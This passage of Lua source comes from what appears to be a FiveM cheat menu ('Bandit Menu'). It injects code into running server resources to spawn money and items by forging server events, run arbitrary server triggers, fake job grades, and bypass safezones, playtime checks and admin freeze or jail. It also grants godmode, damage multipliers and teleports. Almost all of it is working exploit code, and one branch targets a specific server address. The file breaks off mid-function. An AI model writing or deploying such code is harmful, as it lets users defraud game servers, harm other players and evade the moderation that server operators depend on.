                                    SafeRunNative(CreateThread, function()
                                        while InvisibleWeaponThread do
                                            Wait(0)
                                            local ped = PlayerPedId()
                                            local weaponEntity = SafeRunNative(GetCurrentPedWeaponEntityIndex, ped)
                                            if DoesEntityExist(weaponEntity) then
                                                SafeRunNative(SetEntityVisible, weaponEntity, false, false)
                                            end
                                        end
                                    end)
                                ]])
                            else
                                injectCode('monitor', [[
                                    InvisibleWeaponThread = false
                                    Wait(100)
                                    local ped = PlayerPedId()
                                    local weaponEntity = SafeRunNative(GetCurrentPedWeaponEntityIndex, ped)
                                    if DoesEntityExist(weaponEntity) then
                                        SafeRunNative(SetEntityVisible, weaponEntity, true, false)
                                        SafeRunNative(ResetEntityAlpha, weaponEntity)
                                    end
                                ]])
                            end
                        end
                    },
                    {
                        type = "slider",
                        label = "Weapon Damage",
                        value = 1.0,
                        step = 0.1,
                        min = 0.0,
                        max = 10.0,
                        onConfirm = function(sliderValue)
                            injectCode('monitor', string.format([[
                                _G.WeaponDamageMultiplier = %s
                                if not _G.WeaponDamageThread and _G.WeaponDamageMultiplier ~= 1.0 then
                                    _G.WeaponDamageThread = SafeRunNative(CreateThread, function()
                                        while _G.WeaponDamageThread and _G.WeaponDamageMultiplier ~= 1.0 do
                                            Wait(0)
                                            local playerId = PlayerId()
                                            SafeRunNative(SetPlayerWeaponDamageModifier, playerId, _G.WeaponDamageMultiplier)
                                            SafeRunNative(SetPlayerMeleeWeaponDamageModifier, playerId, _G.WeaponDamageMultiplier)
                                        end
                                    end)
                                elseif _G.WeaponDamageMultiplier == 1.0 then
                                    _G.WeaponDamageThread = nil
                                    local playerId = PlayerId()
                                    SafeRunNative(SetPlayerWeaponDamageModifier, playerId, 1.0)
                                    SafeRunNative(SetPlayerMeleeWeaponDamageModifier, playerId, 1.0)
                                end
                            ]], sliderValue))

                            showNotify("Weapon damage set to: " .. sliderValue, "success")
                        end
                    },
                }
            },
        }
    },
    {
        label = 'Vehicles',
        icon = 'ph-car',
        type = 'submenu',
        tabs = {
            {
                name = 'Models',
                submenu = vehicleClassScrollItems
            },
            {
                name = 'Actions',
                submenu = {
                    {
                        type = 'checkbox',
                        label = 'Force Engine On',
                        onConfirm = function(checked)
                            if checked then
                                injectCode('monitor', [[
                                    EngineForceOn = true

                                    SafeRunNative(CreateThread, function()
                                        while EngineForceOn do
                                            local ped = PlayerPedId()
                                            local veh = GetVehiclePedIsUsing(ped)
                                            if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                SafeRunNative(SetVehicleEngineHealth, veh, 1000.0)
                                                SafeRunNative(SetVehicleCanEngineOperateOnFire, veh, true)
                                                SafeRunNative(SetVehicleEngineCanDegrade, veh, false)
                                                SafeRunNative(SetVehicleKeepEngineOnWhenAbandoned, veh, true)
                                                SafeRunNative(SetVehicleEngineOn, veh, true, true, false)
                                            end
                                            Wait(5)
                                        end
                                    end)
                                ]])
                            else
                                injectCode('monitor', [[
                                    local ped = PlayerPedId()
                                    local veh = GetVehiclePedIsUsing(ped)
                                    if veh and veh ~= 0 and DoesEntityExist(veh) then
                                        SafeRunNative(SetVehicleCanEngineOperateOnFire, veh, false)
                                        SafeRunNative(SetVehicleEngineCanDegrade, veh, true)
                                        SafeRunNative(SetVehicleKeepEngineOnWhenAbandoned, veh, false)
                                    end
                                ]])
                            end
                        end
                    },
                    {
                        type = 'checkbox',
                        label = 'Shift Boost',
                        onConfirm = function(checked)
                            if checked then
                                injectCode('monitor', [[
                                    ShiftBoost = true

                                    SafeRunNative(CreateThread, function()
                                        while ShiftBoost do
                                            local ped = PlayerPedId()
                                            if IsPedInAnyVehicle(ped, false) then
                                                local vehicle = GetVehiclePedIsIn(ped, false)
                                                if IsControlPressed(0, 21) then
                                                    SafeRunNative(SetVehicleForwardSpeed, vehicle, 80.0)
                                                end
                                            end

                                            Wait(0)
                                        end
                                    end)
                                ]])
                            else
                                injectCode('monitor', [[
                                    ShiftBoost = false
                                ]])
                            end
                        end
                    },
                    {
                        type = 'checkbox',
                        label = 'Vehicle Godmode',
                        onConfirm = function(checked)
                            injectCode('monitor', string.format([[
                                VehicleGodmode = %s

                                local setVehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                if setVehicle and setVehicle ~= 0 then
                                    SafeRunNative(SetEntityInvincible, setVehicle, VehicleGodmode)
                                end
                            ]], checked))
                        end
                    },
                    {
                        type = 'checkbox',
                        label = 'Vehicle Invisibility',
                        onConfirm = function(checked)
                            injectCode('monitor', string.format([[
                                VehicleGodmode = %s

                                local setVehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                                if setVehicle and setVehicle ~= 0 then
                                    SafeRunNative(SetEntityVisible, setVehicle, not VehicleGodmode, VehicleGodmode)
                                end
                            ]], checked))
                        end
                    },
                    {
                        type = 'checkbox',
                        label = 'Vehicle Hop',
                        onConfirm = function(checked)
                            injectCode('monitor', string.format([[
                                VehicleJump = %s

                                SafeRunNative(CreateThread, function()
                                    while VehicleJump do
                                        local ped = PlayerPedId()
                                        local veh = GetVehiclePedIsUsing(ped)
                                        if veh and veh ~= 0 and DoesEntityExist(veh) then
                                            if SafeRunNative(IsDisabledControlPressed, 0, 22) then
                                                local JumpForce = 6.0
                                                SafeRunNative(ApplyForceToEntity, veh, 1, 0.0, 0.0, JumpForce, 0.0, 0.0, 0.0, 0, true, true, true, true, true)
                                            end
                                        end
                                        Wait(1)
                                    end
                                end)
                            ]], checked))
                        end
                    },
                    {
                        type = 'checkbox',
                        label = 'Instant Brakes',
                        onConfirm = function(checked)
                            injectCode('monitor', string.format([[
                                InstantBreak = %s

                                SafeRunNative(CreateThread, function()
                                    while InstantBreak do
                                        local ped = PlayerPedId()
                                        local veh = GetVehiclePedIsUsing(ped)
                                        if veh and veh ~= 0 and DoesEntityExist(veh) then
                                            if SafeRunNative(IsDisabledControlPressed, 0, 33) and IsPedInAnyVehicle(ped, false) then
                                                SafeRunNative(SetVehicleForwardSpeed, veh, 0.0)
                                            end
                                        end
                                        Wait(1)
                                    end
                                end)
                            ]], checked))
                        end
                    },
                    {
                        type = 'checkbox',
                        label = 'Bulletproof Tires',
                        onConfirm = function(checked)
                            injectCode('monitor', string.format([[
                                BulletproofTires = %s

                                SafeRunNative(CreateThread, function()
                                    while BulletproofTires do
                                        local ped = PlayerPedId()
                                        local veh = GetVehiclePedIsUsing(ped)
                                        if veh and veh ~= 0 then
                                            SafeRunNative(SetVehicleTyresCanBurst, veh, not BulletproofTires)
                                        end
                                        Wait(1)
                                    end
                                end)
                            ]], checked))
                        end
                    },
                    {
                        type = 'button',
                        label = 'Repair Vehicle',
                        onConfirm = function()
                            injectCode('monitor', [[ 
                                local ped = PlayerPedId()
                                local veh = GetVehiclePedIsUsing(ped)
                                if veh and veh ~= 0 then
                                    SafeRunNative(SetVehicleFixed, veh)
                                    SafeRunNative(SetVehicleDirtLevel, veh, 0)
                                end
                            ]])
                        end
                    },
                    {
                        type = 'button',
                        label = 'Refuel Vehicle',
                        onConfirm = function()
                            injectCode('monitor', [[ 
                                local ped = PlayerPedId()
                                local veh = GetVehiclePedIsUsing(ped)
                                if veh and veh ~= 0 then
                                    SafeRunNative(SetVehicleFuelLevel, veh, 100.0)
                                end
                            ]])
                        end
                    },
                    {
                        type = 'button',
                        label = 'Flip Vehicle',
                        onConfirm = function()
                            injectCode('monitor', [[ 
                                local ped = PlayerPedId()
                                local veh = GetVehiclePedIsUsing(ped)
                                if veh and veh ~= 0 then
                                    local heading = GetEntityHeading(veh)
                                    SafeRunNative(SetEntityRotation, veh, 0.0, 0.0, heading)
                                end
                            ]])
                        end
                    },
                    {
                        type = 'button',
                        label = 'Clean Vehicle',
                        onConfirm = function()
                            injectCode('monitor', [[ 
                                local ped = PlayerPedId()
                                local veh = GetVehiclePedIsUsing(ped)
                                if veh and veh ~= 0 then
                                    local heading = GetEntityHeading(veh)
                                    SafeRunNative(SetVehicleDirtLevel, veh, 0.0)
                                end
                            ]])
                        end
                    },
                    {
                        type = 'button',
                        label = 'Delete Vehicle',
                        onConfirm = function()
                            injectCode('monitor', [[ 
                                local veh = GetVehiclePedIsUsing(PlayerPedId())
                                if veh and veh ~= 0 then
                                    SafeRunNative(DeleteVehicle, veh)
                                end
                            ]])
                        end
                    },
                    {
                        type = 'button',
                        label = 'Max Vehicle Upgrades',
                        onConfirm = function()
                            injectCode('monitor', [[ 
                                local ped = PlayerPedId()
                                local veh = GetVehiclePedIsUsing(ped)
                                if veh and veh ~= 0 then
                                    SafeRunNative(SetVehicleModKit, veh, 0)
                                    SafeRunNative(SetVehicleWheelType, veh, 7)
                                    for i = 0, 16 do
                                        local max = GetNumVehicleMods(veh, i)
                                        if max and max > 0 then SafeRunNative(SetVehicleMod, veh, i, max - 1, false) end
                                    end
                                    for i = 17, 22 do SafeRunNative(ToggleVehicleMod, veh, i, true) end
                                    SafeRunNative(SetVehicleMod, veh, 23, 1, false)
                                    SafeRunNative(SetVehicleMod, veh, 24, 1, false)
                                    for _, mod in ipairs({ 25, 27, 28, 30, 33, 34, 35 }) do
                                        local max = GetNumVehicleMods(veh, mod)
                                        if max and max > 0 then SafeRunNative(SetVehicleMod, veh, mod, max - 1, false) end
                                    end
                                    local max38 = SafeRunNative(GetNumVehicleMods, veh, 38)
                                    if max38 and max38 > 0 then SafeRunNative(SetVehicleMod, veh, 38, max38 - 1, true) end
                                    SafeRunNative(SetVehicleWindowTint, veh, 1)
                                    SafeRunNative(SetVehicleTyresCanBurst, veh, false)
                                end
                            ]])
                        end
                    },
                    {
                        type = 'button',
                        label = 'Teleport Into Nearest Vehicle',
                        onConfirm = function()
                            injectCode('monitor', [[
                                local ped = PlayerPedId()
                                local veh = GetClosestVehicle(GetEntityCoords(ped), 10.0, 0, 70)
                                if veh and veh ~= 0 then
                                    SafeRunNative(TaskWarpPedIntoVehicle, ped, veh, -1)
                                end
                            ]])
                        end
                    },
                    {
                        type = 'button',
                        label = 'Set License Plate',
                        onConfirm = function()
                            showInput('Enter License Plate', '', function(plateText)
                                if plateText and plateText ~= '' then
                                injectCode('monitor', string.format([[
                                    local plate = '%s'
                                    local ped = PlayerPedId()
                                    if IsPedInAnyVehicle(ped, false) then
                                        local veh = GetVehiclePedIsIn(ped, false)
                                        SafeRunNative(SetVehicleNumberPlateText, veh, plate)
                                    end
                                ]], plateText))
                                end
                            end)
                        end
                    },
                }
            },
        }
    },
    {
        label = 'Teleports',
        type = 'submenu',
        tabs = {
            {
                name = 'Main',
                submenu = {
                    {
                        label = 'Teleport To Waypoint',
                        type = 'button',
                        onConfirm = function()
                            injectCode('monitor', [[
                                local function FindZForCoords(x, y)
                                    local found = true
                                    local START_Z = 1500
                                    local z = START_Z
                                    while found and z > 0 do
                                        local _found, _z = GetGroundZAndNormalFor_3dCoord(x + 0.0, y + 0.0, z - 1.0)
                                        if _found then
                                            z = _z + 0.0
                                        end
                                        found = _found
                                        Wait(0)
                                    end
                                    if z == START_Z then return nil end
                                    return z + 0.0
                                end

                                local function FindZForCoordsRetry(x, y)
                                    local finalZ
                                    for i = 1, 10 do
                                        finalZ = FindZForCoords(x, y)
                                        if finalZ ~= nil and finalZ ~= 0.0 then
                                            return finalZ
                                        end
                                        Wait(250)
                                    end
                                    return nil
                                end

                                local function TeleportToCoords(x, y, z)
                                    local ped = PlayerPedId()
                                    DoScreenFadeOut(250)
                                    while not IsScreenFadedOut() do Wait(0) end
                                    SafeRunNative(SetPedCoordsKeepVehicle, ped, x, y, 100.0)
                                    while IsEntityWaitingForWorldCollision(ped) do Wait(100) end
                                    if z == 0 or z == 0.0 then
                                        local groundZ = FindZForCoordsRetry(x, y)
                                        if groundZ ~= nil then z = groundZ else z = 100.0 end
                                    end
                                    SafeRunNative(SetPedCoordsKeepVehicle, ped, x, y, z)
                                    DoScreenFadeIn(250)
                                end

                                local function TeleportToWaypoint()
                                    if not IsWaypointActive() then return end
                                    local wpBlip = GetFirstBlipInfoId(GetWaypointBlipEnumId())
                                    if wpBlip == 0 then return end
                                    local c = GetBlipInfoIdCoord(wpBlip)
                                    TeleportToCoords(c.x, c.y, 0.0)
                                end

                                TeleportToWaypoint()
                            ]])
                        end
                    },
                    {
                        label = 'Teleport To Coords',
                        type = 'button',
                        onConfirm = function()
                            showInput('Coords', '', function(setCoords)
                                local x, y, z = setCoords:match('([%-%.%d]+)%s*,%s*([%-%.%d]+)%s*,%s*([%-%.%d]+)')
                                if x and y and z then
                                    injectCode('monitor', string.format([[
                                        local selfPed = PlayerPedId()
                                        SafeRunNative(SetEntityCoords, selfPed, %s, %s, %s, false, false, false, true)
                                    ]], x, y, z))
                                end
                            end)
                        end
                    },
                    { type = 'divider', label = 'Other' },
                    {
                        label = 'Teleport to Grove Street',
                        type = 'button',
                        onConfirm = function()
                            TeleportToCoords(-19.6771, -1823.3564, 25.7877)
                        end
                    },
                    {
                        label = 'Teleport to Legion Square',
                        type = 'button',
                        onConfirm = function()
                            TeleportToCoords(163.7673, -985.2001, 30.0919)
                        end
                    },
                    {
                        label = 'Teleport to Pillbox',
                        type = 'button',
                        onConfirm = function()
                            TeleportToCoords(296.0087, -591.5303, 43.2728)
                        end
                    },
                    {
                        label = 'Teleport to PD Station',
                        type = 'button',
                        onConfirm = function()
                            TeleportToCoords(428.2354, -978.6432, 30.7101)
                        end
                    },
                    {
                        label = 'Teleport to Prison',
                        type = 'button',
                        onConfirm = function()
                            TeleportToCoords(1845.9399, 2585.8032, 45.672)
                        end
                    },
                    {
                        label = 'Teleport to Sandy Shores',
                        type = 'button',
                        onConfirm = function()
                            TeleportToCoords(1839.7155, 3672.1274, 34.2767)
                        end
                    },
                    {
                        label = 'Teleport to Paleto Bay',
                        type = 'button',
                        onConfirm = function()
                            TeleportToCoords(122.0351, 6615.623, 31.8393)
                        end
                    },
                    {
                        label = 'Teleport to Pacific Bank',
                        type = 'button',
                        onConfirm = function()
                            TeleportToCoords(229.376, 214.0773, 105.5446)
                        end
                    },
                    {
                        label = 'Teleport to Airport',
                        type = 'button',
                        onConfirm = function()
                            TeleportToCoords(-1336.1408, -3044.0953, 13.9444)
                        end
                    },
                    {
                        label = 'Teleport to Skate Park',
                        type = 'button',
                        onConfirm = function()
                            TeleportToCoords(-959.0182, -780.0942, 17.8407)
                        end
                    },
                    {
                        label = 'Teleport to Crane',
                        type = 'button',
                        onConfirm = function()
                            TeleportToCoords(-119.8193, -976.3508, 296.2016)
                        end
                    },
                    {
                        label = 'Teleport to Aircraft Carrier',
                        type = 'button',
                        onConfirm = function()
                            TeleportToCoords(3080.6875, -4705.1495, 15.2623)
                        end
                    },
                    {
                        label = 'Teleport to FIB Building',
                        type = 'button',
                        onConfirm = function()
                            TeleportToCoords(136.0723, -749.3616, 258.1519)
                        end
                    },
                    {
                        label = 'Teleport to Maze Bank',
                        type = 'button',
                        onConfirm = function()
                            TeleportToCoords(-75.1061, -819.0154, 326.1753)
                        end
                    },
                    {
                        label = 'Teleport to Mt. Chiliad',
                        type = 'button',
                        onConfirm = function()
                            TeleportToCoords(454.0278, 5571.9067, 781.184)
                        end
                    },
                    {
                        label = 'Teleport to Casino',
                        type = 'button',
                        onConfirm = function()
                            TeleportToCoords(923.4423, 47.4777, 81.1063)
                        end
                    },
                    {
                        label = 'Teleport to LS Customs',
                        type = 'button',
                        onConfirm = function()
                            TeleportToCoords(-379.3948, -118.3053, 38.6872)
                        end
                    },
                    {
                        label = 'Teleport to The Pier',
                        type = 'button',
                        onConfirm = function()
                            TeleportToCoords(-1848.3123, -1229.711, 13.0172)
                        end
                    },
                    {
                        label = 'Teleport to The Docks',
                        type = 'button',
                        onConfirm = function()
                            TeleportToCoords(978.3339, -3115.1434, 5.9008)
                        end
                    },
                }
            }
        }
    },
    {
        label = 'Exploits',
        type = 'submenu',
        tabs = {
            {
                name = 'Spawners',
                submenu = {
                    {
                        label = 'Spawn Item',
                        type = 'button',
                        onConfirm = function()
                            showInput('Item Name', '', function(itemName)
                                Wait(400)
                                showInput('Item Amount', '', function(amount)
                                    if itemName and itemName ~= '' then
                                        spawnItem(itemName, amount)
                                        Debug('Attempting To Spawn', itemName, amount)
                                    end
                                end)
                            end)
                        end
                    },
                    {
                        label = 'Spawn Money',
                        type = 'button',
                        onConfirm = function()
                            showInput('Amount', '', function(SET_AMOUNT)
                                local amount = tonumber(SET_AMOUNT)
                                if not amount or amount <= 0 then return end

                                if GetResourceState("codewave-sneaker-phone") == "started" then
                                    injectCode("codewave-sneaker-phone", string.format([[
                                        SafeRunNative(_G.TriggerEvent, 'delivery:completeDeliveryShoes', %d)
                                    ]], amount))
                                elseif GetResourceState("codewave-handbag-phone") == "started" then
                                    injectCode("codewave-handbag-phone", string.format([[
                                        SafeRunNative(_G.TriggerEvent, 'delivery:completeDeliveryhandbags', %d)
                                    ]], amount))
                                elseif GetResourceState("codewave-wigs-v3-phone") == "started" then
                                    injectCode("codewave-wigs-v3-phone", string.format([[
                                        SafeRunNative(_G.TriggerEvent, 'delivery:completeDeliveryWigss', %d)
                                    ]], amount))
                                elseif GetResourceState("codewave-nails-phone") == "started" then
                                    injectCode("codewave-nails-phone", string.format([[
                                        SafeRunNative(_G.TriggerEvent, 'delivery:completeDeliveryEvent', %d)
                                    ]], amount))
                                elseif GetResourceState("codewave-lashes-phone") == "started" then
                                    injectCode("codewave-lashes-phone", string.format([[
                                        SafeRunNative(_G.TriggerEvent, 'delivery:giveRewardlashes', %d)
                                    ]], amount))
                                elseif GetResourceState("at_labubu") == "started" then
                                      MachoInjectResourceRaw('ox_lib', [[
                                        SendNUIMessage = function(data) 
                                            if type(data) == 'table' and data.action == 'notify' then 
                                                return 
                                            end 
                                            return SendNUIMessage(data) 
                                        end
                                    ]])

                                    injectCode("at_labubu", string.format([[
                                        SafeRunNative(CreateThread, function()
                                            _G.TaskTurnPedToFaceEntity = function() end
                                            _G.AttachEntityToEntity = function() end
                                            _G.DeletePed = function() end
                                            _G.DeleteEntity = function() end
                                            _G.TaskPlayAnim = function() end
                                            _G.ClearPedTasks = function() end

                                            for i = 1, %d do
                                                SafeRunNative(sell_ped, buyerPed, 'bubu_monster', 0)
                                            end
                                        end)
                                    ]], amount))
                                elseif GetResourceState('codewave-icebox-phone') == 'started' and GetCurrentServerEndpoint() == '191.96.152.17:30120' then
                                    injectCode('codewave-icebox-phone', string.format([[
                                        SafeRunNative(_G.TriggerEvent, 'delivery:completeDeliveryiceboxs', %d)
                                    ]], amount))
                                else
                                    showNotify("No supported money script found.", "error")
                                end
                            end)
                        end
                    },
                    {
                        label = 'Skating Buy Item Trigger',
                        type = 'button',
                        desc = 'Trigger __ox_cb_skating:server:buyItem directly',
                        onConfirm = function()
                            showInput('Item Name', '', function(itemName)
                                if not itemName or itemName == '' then return end
                                Wait(400)
                                showInput('Item Amount', '1', function(itemAmt)
                                    local amount = tonumber(itemAmt) or 1
                                    local targetRes = (MachoResourceInjectable and MachoResourceInjectable('skating')) and 'skating' or 'any'
                                    injectCode(targetRes, string.format([[
                                        local SET_ITEM = '%s'
                                        local SET_AMOUNT = %d

                                        if lib and lib.callback then
                                            pcall(function() lib.callback.await('skating:server:buyItem', false, SET_ITEM, SET_AMOUNT) end)
                                            pcall(function() lib.callback.await('skating:server:buyItem', false, { item = SET_ITEM, count = SET_AMOUNT, price = 0 }) end)
                                        end

                                        SafeRunNative(TriggerServerEvent, '__ox_cb_skating:server:buyItem', 'skating', 'skating:server:buyItem:xxxx', SET_ITEM, SET_AMOUNT)
                                        SafeRunNative(TriggerServerEvent, '__ox_cb_skating:server:buyItem', SET_ITEM, SET_AMOUNT)
                                        SafeRunNative(TriggerServerEvent, '__ox_cb_skating:server:buyItem', 'skating', 'skating:server:buyItem:xxxx', { item = SET_ITEM, count = SET_AMOUNT, price = 0 })
                                        SafeRunNative(TriggerServerEvent, '__ox_cb_skating:server:buyItem', { item = SET_ITEM, count = SET_AMOUNT, price = 0 })
                                    ]], itemName, amount))
                                    showNotify(('Sent skating:buyItem trigger for %dx %s'):format(amount, itemName), 'success')
                                end)
                            end)
                        end
                    },
                }
            },
            {
                name = 'Triggers',
                submenu = {
                    {
                        label = 'Skating Buy Item',
                        type = 'button',
                        desc = 'Trigger __ox_cb_skating:server:buyItem',
                        onConfirm = function()
                            showInput('Item Name', '', function(itemName)
                                if not itemName or itemName == '' then return end
                                Wait(400)
                                showInput('Item Amount', '1', function(itemAmt)
                                    local amount = tonumber(itemAmt) or 1
                                    local targetRes = (MachoResourceInjectable and MachoResourceInjectable('skating')) and 'skating' or 'any'
                                    injectCode(targetRes, string.format([[
                                        local SET_ITEM = '%s'
                                        local SET_AMOUNT = %d

                                        if lib and lib.callback then
                                            pcall(function() lib.callback.await('skating:server:buyItem', false, SET_ITEM, SET_AMOUNT) end)
                                            pcall(function() lib.callback.await('skating:server:buyItem', false, { item = SET_ITEM, count = SET_AMOUNT, price = 0 }) end)
                                        end

                                        SafeRunNative(TriggerServerEvent, '__ox_cb_skating:server:buyItem', 'skating', 'skating:server:buyItem:xxxx', SET_ITEM, SET_AMOUNT)
                                        SafeRunNative(TriggerServerEvent, '__ox_cb_skating:server:buyItem', SET_ITEM, SET_AMOUNT)
                                        SafeRunNative(TriggerServerEvent, '__ox_cb_skating:server:buyItem', 'skating', 'skating:server:buyItem:xxxx', { item = SET_ITEM, count = SET_AMOUNT, price = 0 })
                                        SafeRunNative(TriggerServerEvent, '__ox_cb_skating:server:buyItem', { item = SET_ITEM, count = SET_AMOUNT, price = 0 })
                                    ]], itemName, amount))
                                    showNotify(('Sent skating:buyItem trigger for %dx %s'):format(amount, itemName), 'success')
                                end)
                            end)
                        end
                    },
                    {
                        label = 'Run Custom Trigger',
                        type = 'button',
                        desc = 'Execute any server trigger through bypass',
                        onConfirm = function()
                            showInput('Resource (skating or any)', 'skating', function(resource)
                                resource = (resource and resource ~= '') and resource or 'any'
                                Wait(400)
                                showInput('Trigger / Lua code', 'TriggerServerEvent("__ox_cb_skating:server:buyItem")', function(code)
                                    if code and code ~= '' then
                                        runTrigger(resource, code)
                                    end
                                end)
                            end)
                        end
                    }
                }
            },
            {
                name = 'Others',
                submenu = {
                    {
                        label = 'Bypass Safezones',
                        type = 'checkbox',
                        checked = false,
                        onConfirm = function(checked)
                            injectCode('monitor', string.format([[
                                _G.SetClient_BypassSafezones = %s
                                if _G.SetClient_BypassSafezones and not _G.SetClient_BypassSafezonesThread then
                                    _G.SetClient_BypassSafezonesThread = true
                                    SafeRunNative(CreateThread, function()
                                        while _G.SetClient_BypassSafezones do
                                            SafeRunNative(NetworkSetFriendlyFireOption, true)
                                            SafeRunNative(SetCanAttackFriendly, PlayerPedId(), true, false)
                                            Wait(0)
                                        end
                                        _G.SetClient_BypassSafezonesThread = false
                                    end)
                                end
                            ]], checked and 'true' or 'false'))
                            showNotify('Bypass Safezones ' .. (checked and 'On' or 'Off'), checked and 'success' or 'info')
                        end
                    },
                    {
                        label = 'Tx Admin Mode',
                        type = 'scroll',
                        options = {
                            {
                                label = 'Noclip',
                                value = 'noclip',
                            },
                            {
                                label = 'God Mode',
                                value = 'godmode',
                            },
                            {
                                label = 'Super Jump',
                                value = 'superjump',
                            },
                            {
                                label = 'None',
                                value = 'none',
                            },
                        },
                        selected = 1,
                        onConfirm = function(setType)
                            injectCode('monitor', string.format([[
                                SafeRunNative(TriggerEvent, 'txcl:setPlayerMode', '%s', true)
                            ]], setType.value))
                        end
                    },
                    {
                        label = 'Weapon Spawn Codes',
                        type = 'button',
                        onConfirm = function()
                            injectCode('ox_inventory', [[
                                local items = exports.ox_inventory:Items()
                                local options = {}

                                for name, data in pairs(items) do
                                    if name:upper():sub(1, 7) == 'WEAPON_' then
                                        options[#options+1] = {
                                            title = data.label or name,
                                            image = 'nui://ox_inventory/web/images/' .. name .. '.png',
                                            description = ('Item: %s'):format(name),
                                            onSelect = function()
                                                SafeRunNative(lib.setClipboard, name)
                                            end
                                        }
                                    end
                                end

                                for i = 1, #options do
                                    for j = i + 1, #options do
                                        if options[j].title < options[i].title then
                                            options[i], options[j] = options[j], options[i]
                                        end
                                    end
                                end

                                SafeRunNative(lib.registerContext, {
                                    id = 'junkie:weaponList',
                                    title = 'Bandit Menu',
                                    options = options
                                })

                                SafeRunNative(lib.showContext, 'junkie:weaponList')
                            ]])
                        end
                    },
                    {
                        label = 'Set Job (Server)',
                        type = 'button',
                        onConfirm = function()
                            showInput('Enter Job Name', '', function(setJob)
                                Wait(400)
                                showInput('Enter Job Grade', '', function(setGrade)
                                    if setJob and setJob ~= '' and setGrade and setGrade ~= '' then
                                        local grade = tonumber(setGrade) or 0

                                        if MachoResourceInjectable('v_multijob') then
                                            injectCode('v_multijob', string.format([[
                                                SafeRunNative(TriggerServerEvent, 'multijob:newJob', {
                                                    name = '%s',
                                                    label = '%s',
                                                    grade = %d,
                                                    grade_label = '%s',
                                                    grade_salary = 9999,
                                                    grade_name = '%s',
                                                    onduty = true
                                                })
                                            ]], setJob, setJob, grade, setJob, setJob))
                                        elseif MachoResourceInjectable('p_multijob') then
                                            injectCode('p_multijob', string.format([[
                                                SafeRunNative(TriggerServerEvent, 'multijob:newJob', {
                                                    name = '%s',
                                                    label = '%s',
                                                    grade = %d,
                                                    grade_label = '%s',
                                                    grade_salary = 9999,
                                                    grade_name = '%s',
                                                    onduty = true
                                                })
                                            ]], setJob, setJob, grade, setJob, setJob))
                                        elseif MachoResourceInjectable('wasabi_multijob') or MachoResourceInjectable('wasabi_mulitjob') then
                                            local targetRes = MachoResourceInjectable('wasabi_multijob') and 'wasabi_multijob' or 'wasabi_mulitjob'
                                            injectCode(targetRes, string.format([[
                                                SafeRunNative(TriggerEvent, 'wasabi_multijob:clockIn', { job = '%s', grade = %d })
                                            ]], setJob, grade))
                                        elseif MachoResourceInjectable('core_multijob') then
                                            injectCode('core_multijob', string.format([[
                                                local jobs = {
                                                    {
                                                        label = 'PRESS',
                                                        name = '%s',
                                                        grade_label = 'Doctor',
                                                        salary = 420,
                                                        removable = true,
                                                        grade = %d,
                                                        online = 69
                                                    }
                                                }

                                                SetNuiFocus(true, true)
                                                SendNUIMessage({
                                                    type = 'open',
                                                    job = { job = 'unemployed', grade = 0 },
                                                    jobs = json.encode(jobs),
                                                    offduty = true,
                                                    isFemale = false
                                                })
                                            ]], setJob, grade))
                                        else
                                            showNotify('No supported resource found!', 'error')
                                        end
                                    end
                                end)
                            end)
                        end
                    },
                    {
                        label = 'PlayTime Bypass',
                        type = 'button',
                        onConfirm = function()
                            if MachoResourceInjectable('reborn_playtime') then
                                injectCode('reborn_playtime', [[
                                    local _TriggerEvent = _ENV.TriggerEvent
                                    _G.TriggerEvent = function(event, ...)
                                        if event == 'ox_inventory:disarm' then
                                            return
                                        end

                                        return SafeRunNative(_TriggerEvent, event, ...)
                                    end
                                ]])
                            elseif MachoResourceInjectable('DE_playtime') then
                                injectCode('DE_playtime', [[
                                    local _origCB = ESX.TriggerServerCallback

                                    ESX.TriggerServerCallback = function(name, cb, ...)
                                        if name == 'DE_playtime:getHours' then
                                            return cb(420)
                                        else
                                            return SafeRunNative(_origCB, name, cb, ...)
                                        end
                                    end
                                ]])
                            elseif MachoResourceInjectable('lsc_playtime') then
                                injectCode('lsc_playtime', [[
                                    if not _G.OriginalTriggerServerEvent then
                                        _G.OriginalTriggerServerEvent = _G.TriggerServerEvent
                                    end

                                    _G.TriggerServerEvent = function(eventName, ...)
                                        if eventName == 'lsc_playtime:checkWeapon' then
                                            return
                                        end
                                        return _G.OriginalTriggerServerEvent(eventName, ...)
                                    end

                                    if not _G.OriginalRemoveAllPedWeapons then
                                        _G.OriginalRemoveAllPedWeapons = _G.RemoveAllPedWeapons
                                    end

                                    _G.RemoveAllPedWeapons = function(...)
                                        return
                                    end
                                ]])
                            elseif MachoResourceInjectable('abstract_playtime') then
                                injectCode('abstract_playtime', [[
                                    local _TriggerServerEvent = TriggerServerEvent
                                    function TriggerServerEvent(event, ...)
                                        if event == 'abs_playtime:checkWeapon' then return end
                                        return SafeRunNative(_TriggerServerEvent, event, ...)
                                    end
                                ]])
                            elseif MachoResourceInjectable('whizz_playtime') then
                                MachoResourceStop('whizz_playtime')
                            else
                                showNotify('No resources Found for PlayTime', 'success')
                            end
                        end
                    },
                    {
                        label = 'Get Out Of Admin Freeze',
                        type = 'button',
                        onConfirm = function()
                            injectCode('monitor', [[
                                local p = PlayerPedId()
                                SafeRunNative(FreezeEntityPosition, p, false)
                                SafeRunNative(ClearPedTasksImmediately, p)
                                SafeRunNative(SetEntityInvincible, p, _G.junkieGodmode or false)
                                if IsPedInAnyVehicle(p, false) then
                                    local v = GetVehiclePedIsIn(p, false)
                                    if v and v ~= 0 then
                                        SafeRunNative(FreezeEntityPosition, v, false)
                                    end
                                end
                            ]])
                            showNotify('Admin freeze removed', 'success')
                        end
                    },
                    {
                        label = 'Get Out Of Admin Jail',
                        type = 'button',
                        onConfirm = function()
                            if GetResourceState("adminplus-adminjail") ~= "started" then
                                showNotify("Resource Isn't Running", "error")
                                return
                            end
                            injectCode('adminplus-adminjail', [[
                                SafeRunNative(TriggerEvent, 'adminjail:setInAdminJail', false)
                            ]])
                        end
                    },
                    {
                        label = 'Remove Crutch',
                        type = 'button',
                        onConfirm = function()
                            if GetResourceState("wasabi_crutch") ~= "started" then
                                showNotify("Resource Isn't Running", "error")
                                return
                            end
                            injectCode("wasabi_crutch", [[
                                _G.StopCrutchLoop = true
                                _G.BreakLoop = true

                                if DisableKeys then
                                    DisableKeys.crutch = nil
                                end

                                SafeRunNative(ResetPedMovementClipset, PlayerPedId())

                                local pool = GetGamePool("CObject")

                                for _, obj in pairs(pool) do
                                    if DoesEntityExist(obj) then
                                        if GetEntityModel(obj) == GetHashKey("crutch") then
                                            SafeRunNative(DeleteObject, obj)
